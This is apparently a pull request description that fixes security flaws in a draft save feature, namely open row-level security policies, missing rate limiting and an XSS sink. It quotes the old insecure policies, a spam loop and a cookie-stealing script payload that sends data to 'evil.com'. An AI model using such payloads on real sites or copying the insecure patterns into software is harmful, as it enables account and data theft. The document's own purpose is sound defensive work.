# Fix Critical Security Vulnerabilities in Draft Save Feature

## 🚨 Critical Security Fixes for Draft Save Feature

This PR addresses **three critical security vulnerabilities** identified in the draft save feature by a Lovable security scan, plus confirms proper encryption implementation.

---

## 🔒 Security Vulnerabilities Fixed

### 1. ✅ CRITICAL: Overly Permissive RLS Policies

**Issue**: The `report_drafts` table allowed ANY anonymous user to read, update, or delete ANY draft without verification.

**Previous (Dangerous) Policies**:
```sql
CREATE POLICY "Anyone can read drafts with code"
  ON public.report_drafts FOR SELECT USING (true);  -- ALL drafts readable!

CREATE POLICY "Anyone can update drafts"
  ON public.report_drafts FOR UPDATE USING (true);  -- Can modify ANY draft!

CREATE POLICY "Anyone can delete drafts"
  ON public.report_drafts FOR DELETE USING (true);  -- Can delete ANY draft!
```

**Attack Scenario**: Attacker could use Supabase client directly to read ALL drafts:
```javascript
const allDrafts = await supabase.from('report_drafts').select('*');
// Returns ALL drafts from ALL users
```

**Fix**:
- Migration: `20251108190000_fix_draft_rls_policies.sql`
- Removed permissive `USING (true)` policies
- Added restrictive policies for service role only
- Forces all operations through edge functions with server-side `draft_code` verification

---

### 2. ✅ HIGH: No Edge Function Protection

**Issue**: Draft operations bypassed all security controls that protect submitted reports:

| Feature | Submitted Reports | Draft Saves (Before) | Draft Saves (After) |
|---------|------------------|---------------------|---------------------|
| Rate limiting | ✅ 5 per 15 min | ❌ Unlimited | ✅ 10 per 5 min |
| Server-side validation | ✅ Edge function | ❌ Client-only | ✅ Edge function |
| Audit logging | ✅ IP tracking | ❌ None | ✅ IP tracking |
| Abuse prevention | ✅ Multiple layers | ❌ None | ✅ Multiple layers |

**Attack Scenario**: Spam the database with unlimited drafts:
```javascript
for (let i = 0; i < 100000; i++) {
  await supabase.from('report_drafts').insert({ /* spam */ });
}
```

**Fix**:
- Created edge function: `supabase/functions/draft-operations/index.ts`
- **Rate limiting**: 10 operations per 5 minutes per IP (Upstash Redis)
- **Server-side verification**: All `draft_code` validation on server
- **Audit logging**: All operations logged to `system_logs` table
- **Input validation**: Comprehensive server-side checks
- Supports operations: `save`, `resume`, `update`, `delete`

---

### 3. ✅ CRITICAL: XSS Vulnerability in AIContentGenerator

**Issue**: AI-generated content rendered without sanitization on line 259, allowing script execution in admin browsers.

**Previous Code**:
```tsx
<div dangerouslySetInnerHTML={{ __html: generatedPost.content }} />
```

**Attack Scenario**: Malicious AI-generated content could execute scripts:
```html
<script>fetch('evil.com/steal?cookie='+document.cookie)</script>
```

**Fix**:
- Added DOMPurify sanitization
- File: `src/components/AIContentGenerator.tsx`

**New Code**:
```tsx
import DOMPurify from 'dompurify';
// ...
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(generatedPost.content) }} />
```

---

### 4. ✅ CONFIRMED: Encryption Was Already Secure

**Security Scan Claim**: "Weak encryption using Base64"

**Reality**: The encryption was **already using production-ready AES-256-GCM**! The scan was incorrect.

**Actual Implementation**:
- ✅ PBKDF2 key derivation from `draft_code` (100,000 iterations)
- ✅ AES-256-GCM encryption via Web Crypto API
- ✅ Random 12-byte IV for each encryption
- ✅ Proper IV storage and retrieval

---

## 🏗️ Security Architecture

### Before Fixes
```
Client → Direct Supabase Access → Database
  ❌ No rate limiting
  ❌ No draft_code verification (RLS bypass possible)
  ❌ No audit logging
  ❌ Client could read ANY draft
```

### After Fixes
```
Client → Edge Function → Service Role → Database
  ✅ Rate limiting (10 per 5 min)
  ✅ Server-side draft_code verification
  ✅ Audit logging
  ✅ RLS blocks direct client access
  ✅ Only correct draft_code can access draft
```

---

## 📝 Files Changed

- ✅ `supabase/migrations/20251108190000_fix_draft_rls_policies.sql` - Fix RLS policies
- ✅ `supabase/functions/draft-operations/index.ts` - Secure edge function (447 lines)
- ✅ `src/services/draftService.ts` - Updated to use edge function
- ✅ `src/components/AIContentGenerator.tsx` - XSS fix with DOMPurify
- ✅ `SECURITY_FIXES_DRAFT_FEATURE.md` - Comprehensive documentation

---

## 🧪 Testing Required

- [ ] Deploy edge function: `supabase functions deploy draft-operations`
- [ ] Test draft save operation
- [ ] Test draft resume with valid code
- [ ] Test draft resume with **invalid** code (should be rejected)
- [ ] Test draft update operation
- [ ] Test draft delete operation
- [ ] Test rate limiting (make 11 requests in 5 minutes)
- [ ] Verify audit logs appear in `system_logs` table
- [ ] Test XSS prevention in AIContentGenerator
- [ ] Verify direct Supabase client access to drafts is blocked

---

## 🎯 Impact

**Security Level**: Draft saves now match the security level of submitted reports.

**Defense in Depth**:
1. RLS policies (database layer)
2. Edge function validation (application layer)
3. Rate limiting (abuse prevention)
4. Audit logging (monitoring)
5. Encryption (data protection)
6. XSS sanitization (presentation layer)

---

## 📚 References

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Supabase RLS: https://supabase.com/docs/guides/auth/row-level-security
- Web Crypto API: https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API
- DOMPurify: https://github.com/cure53/DOMPurify
